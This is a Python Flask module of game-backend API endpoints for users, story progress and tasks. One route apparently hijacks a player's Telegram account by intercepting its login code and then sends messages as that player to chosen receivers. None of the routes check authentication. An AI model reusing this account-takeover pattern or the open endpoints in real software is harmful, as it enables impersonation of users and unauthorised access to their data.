"""API Endpoints to get and reset data"""
import subprocess
import os, sys
import asyncio
from datetime import datetime
from flask import request, jsonify
from sqlalchemy.exc import InvalidRequestError

from app import app, db
from app.story.exceptions import StoryPointInvalid
from app.models.exceptions import DatabaseError
from app.models.game_models import User, TaskAssignment
from app.models.userdata_models import Contact, spydatatypes
from app.models.personalization_model import Personalization
from app.models.utility import db_entry_to_dict, db_single_element_query
from app.story.story_controller import StoryController
from app.telegram_highjack.hacked_client import HackedClient
from app.firebase_interaction import FirebaseInteraction

# ------------------- Hacking players telegram account ---------------------
@app.route('/users/<user_id>/hack/send-message', methods=['POST'])
def send_user_message(user_id):
    """tries to hack a user account and send a message via his account"""
    messages = request.get_json()
    if not messages:
        return jsonify("please valid json"), 400
    if not isinstance(messages, list):
        return jsonify("please provide a list of messages [message, message, ...]"), 400     
    for message in messages:
        if not message.get("receiver"):
            return jsonify("missing receiver"), 400
        if not message.get("text"):
            return jsonify("missing text"), 400
    
    try:
        user = db_single_element_query(User, {"user_id": user_id}, "user")
    except ValueError as e:
        return jsonify([str(e)]), 400
    if not user.phonenumber:
        return jsonify("you must first set the users phonenumber"), 400

    asyncio.run(hack_and_send_message(int(user_id), user.phonenumber, messages))
    return jsonify("client hacked and message sent"), 200

async def hack_and_send_message(user_id, phonenumber, messages):
    """tries to hack a user account and send a message via his account"""
    client = HackedClient(user_id, phonenumber, FirebaseInteraction.steal_auth_code)
    async with client:
        for message in messages:
            await client.send_message(message.get("receiver"), message.get("text"))

# ---------- Display/Edit User Info ----------
@app.route('/users/<user_id>')
def get_user(user_id):
    """Returns a user dict"""
    try:
        user = User.query.get(int(user_id))
        if user:
            return jsonify(db_entry_to_dict(user, camel_case=True)), 200
        else:
            return jsonify("No such user"), 400
    except ValueError:
        # Invalid ID Type
        return jsonify("Invalid userId"), 400

@app.route('/users/<user_id>/reset')
def reset_user(user_id):
    """Resets users to 'before register' state"""
    try:
        user = User.query.get(int(user_id))
        if user:
            user.handle = None
            user.firstname = None
            user.current_story_point = None
            user.firebase_token = None
            user.phonenumber = None
            db.session.add(user)

            user_personalization = Personalization.query.get(user.user_id)
            if user_personalization:
                db.session.delete(user_personalization)
            db.session.commit()

            StoryController.reset_tasks(user.user_id)

            return jsonify("User was reset"), 200
        else:
            return jsonify("No such user"), 400
        
    except ValueError:
        # Invalid ID Type
        return jsonify("Invalid userId"), 400

@app.route('/users/<user_id>/story/current-story-point', methods=['GET', 'POST'])
def current_story_point(user_id):
    """Returns a users current story point"""
    try:
        if request.method == 'GET':
            return jsonify(StoryController.get_current_story_point(user_id))
        if request.method == 'POST':
            new_story_point = request.args.get("set")
            if not new_story_point:
                return jsonify("please provide a valid story point in the set parameter")
            try:
                StoryController.set_current_story_point(user_id, new_story_point, reset_tasks=True)
            except StoryPointInvalid as e:
                return jsonify(e.args[0])
            return jsonify(f"current story point set to {new_story_point}")
    except DatabaseError as e:
        return jsonify(e.args[0])

@app.route('/users/<user_id>/story/reset')
def reset_story(user_id):
    try:
        StoryController.start_story(user_id)
    except DatabaseError as e:
        return jsonify(e.args[0])
    return jsonify("story was reset")

@app.route('/users')
def all_users():
    """Lists all created users"""
    if request.args.get("handle"):
        try:
            user = db_single_element_query(User, {"handle": request.args.get("handle")}, "User")
            return jsonify(db_entry_to_dict(user, camel_case=True)), 200
        except ValueError as e:
            return jsonify(str(e)), 400

    return jsonify([db_entry_to_dict(user, camel_case=True) for user in User.query.all()]), 200

@app.route('/datatypes')
def all_available_datatypes():
    """Returns all datatypes that are associated with a db table"""
    return jsonify(spydatatypes.keys()), 200

@app.route('/users/<user_id>/tasks')
def fetch_user_tasks(user_id):
    """Return all tasks (finished and unfinished) assigned to a user"""
    try:
        tasks = TaskAssignment.query.filter_by(user_id=user_id)
    except ValueError:
        return jsonify("Invalid userId"), 400

    return jsonify([db_entry_to_dict(task, camel_case=True) for task in tasks]), 200
